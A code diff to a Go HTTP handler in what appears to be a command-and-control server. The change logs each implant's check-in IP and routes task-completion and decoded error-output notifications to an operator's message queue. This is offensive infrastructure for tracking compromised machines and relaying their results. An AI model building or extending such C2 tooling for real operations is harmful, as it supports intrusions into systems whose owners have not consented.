@@ -37,9 +37,9 @@ func (h *Handler) handleTaskResults() http.HandlerFunc {
 			return
 		}
 
-		// Update last seen
-		if err := h.repos.Implant.UpdateLastSeen(r.Context(), implant.ImplantID); err != nil {
-			h.logger.Error("failed to update last seen",
+		// Update last seen and IP
+		if err := h.repos.Implant.UpdateCheckin(r.Context(), implant.ImplantID, r.RemoteAddr); err != nil {
+			h.logger.Error("failed to update checkin",
 				zap.String("implant_id", implant.ImplantID),
 				zap.Error(err))
 		}
@@ -91,14 +91,21 @@ func (h *Handler) handleTaskResults() http.HandlerFunc {
 
 		// Notify operator
 		if h.publisher != nil {
-			msg := "[" + task.ImplantID + "] Task " + task.TaskID + " completed - " + string(status)
-			h.publisher.PublishToOperator(r.Context(), task.OperatorName, msg)
+			operator, err := h.repos.Operator.GetByUsername(r.Context(), task.OperatorName)
+			if err != nil {
+				h.logger.Error("failed to get operator for notification",
+					zap.String("operator", task.OperatorName),
+					zap.Error(err))
+			} else {
+				msg := "[" + task.ImplantID + "] Task " + task.TaskID + " completed - " + string(status)
+				h.publisher.PublishToOperator(r.Context(), operator.RMQQueue, msg)
 
-			// If error, also send the decoded output
-			if status == model.TaskStatusError {
-				if decoded, err := base64.StdEncoding.DecodeString(req.Output); err == nil {
-					errMsg := "[" + task.ImplantID + "] Task " + task.TaskID + " error output - " + string(decoded)
-					h.publisher.PublishToOperator(r.Context(), task.OperatorName, errMsg)
+				// If error, also send the decoded output
+				if status == model.TaskStatusError {
+					if decoded, err := base64.StdEncoding.DecodeString(req.Output); err == nil {
+						errMsg := "[" + task.ImplantID + "] Task " + task.TaskID + " error output - " + string(decoded)
+						h.publisher.PublishToOperator(r.Context(), operator.RMQQueue, errMsg)
+					}
 				}
 			}
 		}
